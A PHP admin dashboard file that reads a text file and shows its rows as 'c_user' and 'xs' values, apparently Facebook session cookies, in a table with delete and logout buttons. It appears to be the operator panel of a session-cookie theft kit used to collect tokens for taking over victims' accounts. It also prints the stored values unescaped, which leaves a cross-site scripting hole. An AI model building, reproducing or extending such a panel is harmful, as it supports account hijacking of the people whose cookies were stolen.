<?php
// Start the session at the very beginning of the script
session_start();

// Rest of your admin panel logic...

// // Redirect to login page if not logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] != 'admin') {
    header("Location: login.php");
    exit();
}
// Check if the user clicked the logout button
if (isset($_POST['logout'])) {
    // Clear session variables and destroy the session
    session_unset();
    session_destroy();
    header("Location: login.php"); // Redirect to the login page after logout
    exit();
}
if (isset($_POST['delete'])) {
    $rowToDelete = $_POST['delete_row'];

    // Read data from the data.txt file
    $data = file_get_contents('data.txt');
    $data = explode(PHP_EOL, $data);

    // Find and remove the selected row from the array
    $key = array_search($rowToDelete, $data);
    if ($key !== false) {
        unset($data[$key]);
    }

    // Save the updated data back to data.txt
    file_put_contents('data.txt', implode(PHP_EOL, $data));

    // Redirect to the current page to refresh the table
    header("Location: admin.php");
    exit();
}

// Read data from the data.txt file
$data = file_get_contents('data.txt');
$data = explode(PHP_EOL, $data); // Split the data into an array based on line breaks
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <!-- Include Bootstrap CSS link -->
    <style>
        th {
            text-align: center; /* Center-align the text in table headers */
        }
    </style>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1 class="mb-4">Welcome to the Admin Dashboard, Israr Baloch</h1>
        <h2 class="mb-4" style="text-align:center;">Saheed</h2>
        <!-- Apply Bootstrap table styling -->
        <table class="table">
            <thead>
                <tr>
                    <th>Sr. Num</th> <!-- Add Sr. Num column -->
                    <th>c_user</th>
                    <th>xs</th>
                    <!-- Remove the Table Name and Time columns -->
                    <th>Delete</th> <!-- New column for buttons -->
                </tr>
            </thead>
            <tbody>
                <?php 
                $counter = 1; // Initialize the counter
                foreach ($data as $row): 
                ?>
                    <?php $rowData = explode(', ', $row); ?>
                   <tr>
                    <td><?php echo $counter; ?></td> <!-- Print the Sr. Num -->
                    <td><?php echo $rowData[0]; ?></td>
                    <td><?php echo $rowData[1]; ?></td>
                    <td>
                        <form method="POST">
                            <input type="hidden" name="delete_row" value="<?php echo $row; ?>">
                            <button type="submit" class="btn btn-danger" name="delete">Delete</button>
                        </form>
                    </td>
                </tr>
                <?php 
                $counter++; // Increment the counter
                endforeach; 
                ?>
            </tbody>
        </table>
        <form method="POST">
            <button type="submit" class="btn btn-danger" name="logout">Logout</button>
        </form>
    </div>

    <!-- Include Bootstrap JS and jQuery -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
